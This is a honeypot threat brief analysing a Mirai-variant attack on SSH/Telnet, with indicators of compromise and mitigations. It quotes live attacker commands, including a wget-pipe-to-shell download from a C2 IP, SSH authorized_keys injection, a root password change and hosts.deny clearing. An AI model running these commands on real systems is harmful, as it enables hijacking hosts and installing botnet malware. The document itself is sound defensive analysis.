# 🍯 Threat Brief: Mirai Variant Infection Chain Analysis

**Date:** April 2026  
**Analyst:** Thomas  
**Targeted Service:** SSH/Telnet  
**Honeypot Sensor:** T-Pot (Cowrie)  

## 📌 Executive Summary
During routine monitoring of the Azure-based Global Attack Map honeypot network, a complete attack chain was captured involving a malicious actor targeting exposed SSH/Telnet services. By analyzing the interactive session logs within the Cowrie honeypot, the attacker's methodology was successfully reconstructed. The attack progressed from initial system reconnaissance and competitor clearing, to persistence establishment via SSH key injection, and culminated in the delivery of a Mirai-variant payload downloader.

This brief documents the tactical breakdown of the attack lifecycle, associated Indicators of Compromise (IoCs), and defensive mitigation strategies.

---

## 🔍 Phase 1: Environment Reconnaissance & Clearing

Upon successfully authenticating, the attacker did not immediately drop a payload. Instead, they executed a series of manual "Living off the Land" (LotL) commands to evaluate the system's hardware capabilities and eliminate competing botnet infections.

![Reconnaissance and Clearing Commands](./images/recon_commands.png) 
*(Note: Upload the image showing the `lscpu`, `free -m`, and `pkill` commands here)*

### Tactical Breakdown:
* **Hardware Profiling:** The threat actor executed `lscpu | grep Model`, `cat /proc/cpuinfo | grep name | wc -l`, and `free -m` to evaluate the CPU architecture, core count, and available memory. This is highly indicative of evaluating the host for cryptomining potential or selecting the correct architecture payload.
* **Anti-Competition Tactics:** The attacker actively sought to remove competing malware to ensure exclusive access to system resources. They executed `rm -rf /tmp/secure.sh` and `pkill -9 secure.sh` (as well as targeting `auth.sh`).
* **Evasion:** An attempt was made to clear local TCP wrapper blocklists by writing an empty string to `/etc/hosts.deny` (`echo > /etc/hosts.deny`).

---

## 🚪 Phase 2: Establishing Persistence & Lockout

To secure their foothold against both the legitimate system administrator and automated remediation tools, the attacker systematically altered authentication mechanisms.

![Establishing SSH Persistence](./images/ssh_persistence.png)
*(Note: Upload the image showing the `chattr` and `authorized_keys` injection commands here)*

### Tactical Breakdown:
* **Attribute Manipulation:** The attacker executed `chattr -ia .ssh` to remove "immutable" and "append-only" file attributes, ensuring they could modify the directory regardless of local security policies.
* **SSH Key Injection:** The attacker wiped existing SSH configurations and injected their own RSA public key into `~/.ssh/authorized_keys`. The injected key contained a distinct signature comment: `mdrfckr`.

    ```bash
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC...[redacted]... mdrfckr">>.ssh/authorized_keys
    ```

* **Credential Hijacking:** Multiple attempts were made to force a root password change using `chpasswd` (e.g., `echo "root:P0jj5Tr1ObQa"|chpasswd|bash`) to lock out the actual owner.

---

## 💣 Phase 3: Payload Delivery ("The Dropper")

With the environment secured and evaluated, the attacker initiated an automated script to pull down the primary malware payload from a remote Command and Control (C2) infrastructure.

![Malware Payload Delivery Sequence](./images/payload_download.png)
*(Note: Upload the image showing the `wget` and `sin.sh` download attempts here)*

### Tactical Breakdown:
* **The "Shotgun" Download:** The bot attempted to download a script named `sin.sh` into multiple world-writable directories (`/var/tmp`, `/dev/shm`, `/var/run`). This technique ensures the script finds a location with execution permissions, bypassing basic directory restrictions.
* **Fileless Execution:** The attacker utilized a quiet `wget` command piped directly into the shell for immediate execution without writing the initial script to disk permanently:

    ```bash
    wget -qO- http://196.251.107.133/bins/sin.sh|sh &
    ```

---

## 🦠 Phase 4: Threat Intelligence & Malware Analysis

By correlating the honeypot file download logs with the captured interactive commands, the `sin.sh` payload was isolated. The file was extracted from the Cowrie downloads directory for hash generation and external threat intelligence analysis.

![VirusTotal Analysis of sin.sh](./images/virustotal_analysis.png)
*(Note: Upload the screenshot of the VirusTotal detection page here)*

### Indicators of Compromise (IoCs)

| Type | Indicator | Description |
| :--- | :--- | :--- |
| **Attacker IP** | `103.186.1.59` | Source of initial access and reconnaissance commands. |
| **C2 Server IP** | `196.251.107.133` | Infrastructure hosting the `sin.sh` dropper and secondary payloads. |
| **File Hash (SHA-256)** | `c8e8f6236e6bbcee6c407cdd425432e1819871ce5231a1511a0f6ae29ac4cb68` | Dropper script (`sin.sh`). |
| **SSH Key Signature** | `mdrfckr` | Comment appended to the malicious RSA public key. |
| **Targeted Files** | `/tmp/secure.sh`, `/tmp/auth.sh` | Competing malware scripts targeted for termination. |

### Payload Behavior (Mirai Variant)
Static analysis and Threat Intelligence correlation via VirusTotal (Detection Rate: 21/59) classified the `sin.sh` file as a **Trojan Downloader**, specifically belonging to the Mirai botnet family (`SH/Mirai.C.gen!Camelot`). 

**Execution flow of `sin.sh`:**
1. Modifies system file descriptor limits (`ulimit -n 999999`).
2. Copies and utilizes an internal `busybox` binary to ensure necessary network utilities (like `wget` or `curl`) are available even on stripped-down systems.
3. Iterates through 9 architecture-specific binaries (e.g., `px86`, `pmips`, `parm`) hosted on the C2 server.
4. Attempts to download and execute these secondary payloads as a file named `robben` with the activation argument `Sinload`.

---

## 🛡️ Defensive Mitigations

To defend against this specific attack chain in a production environment, the following controls should be implemented:

1. **Disable Password Authentication:** The initial vector relied on brute-forcing or credential stuffing SSH/Telnet. Enforcing Public Key Authentication exclusively mitigates this completely.
2. **Restrict World-Writable Execution:** Mount directories like `/tmp`, `/var/tmp`, and `/dev/shm` with the `noexec` flag in `/etc/fstab` to prevent the execution of dropped payloads like `sin.sh`.
3. **Network Segmentation & Outbound Filtering:** The success of the payload relied on connecting out to `196.251.107.133`. Implementing default-deny egress firewall rules prevents servers from downloading unauthorized external payloads.
4. **File Integrity Monitoring (FIM):** Monitor critical directories like `~/.ssh/` and `/etc/` for unauthorized changes.
